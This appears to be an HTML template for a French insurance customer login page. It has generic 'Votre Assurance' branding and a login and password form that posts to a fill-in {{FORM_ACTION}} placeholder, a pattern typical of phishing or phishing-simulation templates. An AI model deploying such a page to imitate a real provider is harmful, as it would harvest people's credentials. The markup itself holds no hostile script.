<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Espace client - Votre Assurance</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; min-height: 100vh; color: #1a1a1a; }
        .header { background: #0066b3; padding: 20px 5%; }
        .logo { font-size: 1.4rem; font-weight: 700; color: #fff; }
        .center { display: flex; justify-content: center; align-items: center; padding: 40px; }
        .card { background: #fff; width: 100%; max-width: 440px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); }
        h1 { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: #0066b3; }
        .sub { font-size: 0.95rem; color: #666; margin-bottom: 28px; }
        label { display: block; font-size: 0.9rem; font-weight: 600; margin-bottom: 8px; color: #333; }
        input { width: 100%; height: 48px; padding: 0 16px; margin-bottom: 20px; border: 1px solid #d0d5dd; border-radius: 6px; font-size: 16px; }
        input:focus { outline: none; border-color: #0066b3; box-shadow: 0 0 0 2px rgba(0,102,179,0.2); }
        button { width: 100%; height: 48px; background: #0066b3; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #005599; }
        .links { margin-top: 20px; font-size: 14px; }
        .links a { color: #0066b3; text-decoration: none; }
        .links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">Votre Assurance</div>
    </header>
    <div class="center">
        <div class="card">
            <h1>Espace client</h1>
            <p class="sub">Identifiez-vous pour gérer vos contrats et documents en ligne.</p>
            <form method="POST" action="{{FORM_ACTION}}">
                <label for="login">Identifiant ou adresse e-mail</label>
                <input type="text" id="login" name="login" placeholder="Votre identifiant" required autocomplete="username">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required autocomplete="current-password">
                <button type="submit">Se connecter</button>
            </form>
            <p class="links"><a href="#">Identifiant ou mot de passe oublié ?</a></p>
        </div>
    </div>
</body>
</html>
